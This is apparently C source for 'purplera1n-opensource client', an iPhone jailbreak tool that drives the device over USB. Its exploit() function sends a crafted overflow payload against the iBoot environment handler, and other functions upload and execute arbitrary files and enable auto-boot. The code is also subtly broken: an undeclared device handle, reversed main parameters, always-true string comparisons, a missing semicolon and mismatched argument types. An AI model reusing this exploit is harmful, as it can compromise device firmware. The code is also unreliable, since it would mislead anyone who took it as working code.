#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libusb-1.0/libusb.h>

int device_upload(char* filename) {
	
	FILE* file = fopen(filename, "rb");
	
	if(file == NULL) {
		
		printf("[Program] Unable to find file. (%s)\r\n",filename);
		return 1;
		
	}
	
	fseek(file, 0, SEEK_END);
	unsigned int len = ftell(file);
	fseek(file, 0, SEEK_SET);
	
	char* buffer = malloc(len);
	
	if (buffer == NULL) {
		
		printf("[Program] Error allocating memory.\r\n");
		fclose(file);
		return 1;
		
	}
	
	fread(buffer, 1, len, file);
	fclose(file);
	
	int packets = len / 0x800;
	
	if(len % 0x800)
		packets++;
	
	int last = len % 0x800;
	
	if(!last)
		last = 0x800;
	
	int i = 0;
	unsigned int sizesent=0;
	char response[6];
	
	for(i = 0; i < packets; i++) {
		
		int size = i + 1 < packets ? 0x800 : last;
		
		sizesent+=size;
		printf("[Device] Sending packet %d of %d (0x%08x of 0x%08x bytes)/", i+1, packets, sizesent, len);
		
		if(! libusb_control_transfer(device, 0x21, 1, i, 0, &buffer[i * 0x800], size, 1000)) {
			
			printf("[Device] Error sending packet.\r\n");
			return -1;
			
		}
		
		if( libusb_control_transfer(device, 0xA1, 3, 0, 0, response, 6, 1000) != 6) {
			
			printf("[Device] Error receiving status while uploading file.\r\n");
			return -1;
			
		}
		
		if(response[4] != 5) {
			
			printf("[Device] Invalid status error during file upload.\r\n");
			return -1;
		}
		
		printf("[Device] Upload successfull.\r\n");
	}
	
	printf("[Device] Executing file.\r\n");
	
	libusb_control_transfer(device, 0x21, 1, i, 0, buffer, 0, 1000);
	
	for(i = 6; i <= 8; i++) {
		
		if(libusb_control_transfer(device, 0xA1, 3, 0, 0, response, 6, 1000) != 6) {
			
			printf("[Device] Error receiving execution status.\r\n");
			return -1;
		}
		
		if(response[4] != i) {
			
			printf("[Device] Invalid execution status.\r\n");
			return -1;
		}
	}
	
	printf("[Device] Successfully executed file.\r\n");
	
	free(buffer);

	return 0;
}


int device_autoboot() {
	
	printf("[Device] Enabling auto-boot.\r\n");
	
	char* command[3];

	command[0] = "setenv auto-boot true";
	command[1] = "saveenv";
	command[2] = "reboot";
	
	device_sendcmd(&command[0]);
	device_sendcmd(&command[1]);
	device_sendcmd(&command[2]);

	printf("[Device] Done Enabling auto-boot.\r\n");

	return 1;
	
}

int device_sendcmd(char* argv[]) {
	
	char* command = argv[0];
	size_t length = strlen(command);
	
	if (length >= 0x200) {
		printf("[Device] Failed to send command (to long).");
		return -1;
	}
	
	if (! libusb_control_transfer(device, 0x40, 0, 0, 0, command, (length + 1), 1000)) {
		printf("[Device] Failed to send command.\r\n");
		return -1;
	}
	
	return 1;
	
}

int exploit() {

    printf("[Exploit] iBoot Envirement Overflow being executed \n");
	char* cmd = "setenv a bbbbbbbbb1bbbbbbbbb2bbbbbbbbb3bbbbbbbbb4bbbbbbbbb5bbbbbbbbb6bbbbbbbbb7bbbbbbbbb8bbbbbbbbb9bbbbbbbbbAbbbbbbbbbBbbbbbbbbbCbbbbbbbbbDbbbbbbbbbEbbbbbbbbbbbbtbbbbbbbbbubbbbbbbbbvbbbbbbbbbwbbbbbbbbbxbbbbbbbbbybbbbbbbbbzbbbbbbbbbHbbbbbbbbbIbbbbbbbbbJbbbbgeohotbbbbbbbbbLbbbbbbbbbMbbbbbbbbbNbbbbbbbbbObbbbbbbbbPbbbbbbbbbbQbbbbbbbbbRbbbbbbbbbSbbbbbbbbbTbbbbbbbbbUbbbbbbbbbVbbbbbbbbbWbbbbbbbxxxx $a $a $a $a geohotaaaa \"\x04\x01\" \\ \"\x0c\" \\ \\ \\ \\ \\ \"\x41\x04\xA0\x02\" \\ \\ \\ \\ wwww;echo copyright;echo geohot";
	
	device_sendcmd(cmd);
	return -1;

}

void stuff() {

	printf("purplera1n-opensource client v-0.1 \n");
	printf(" ============ Credits ===========\n")
	printf("geohot\n");
	printf("iH8sn0w\n");
	printf("theiphonewiki\n");
	printf("red-bull for keeping me awake\n");
	printf("And me. sjeezpwn/spawncpy/spawnrelloc/3310Spawn3GS/i3ppwn and many other nicks\n");
	printf(" ============ Usage =============\n");
	printf(" -x exploits device using iBoot Envirement overflow exploit\n");
	printf(" -b sets auto-boot to true \n");
	printf(" -f sends file to the device (e.g) a decrypted kernelcache file \n");
}

int main(char* argv[], int argc){

	stuff();

	if (argv[0] == "-x" || "-X") {
		exploit();
		return 1;
	}

	else if (argv[0] == "-b" || "-B") {
		device_autoboot();
		return 1;
	}

    else if (argv[0] == "-f" || "-F") {
        device_upload(argv[1]);
        return 1;
    }

    else {
    	printf("Command not found\n");
    	return -1;
    }


}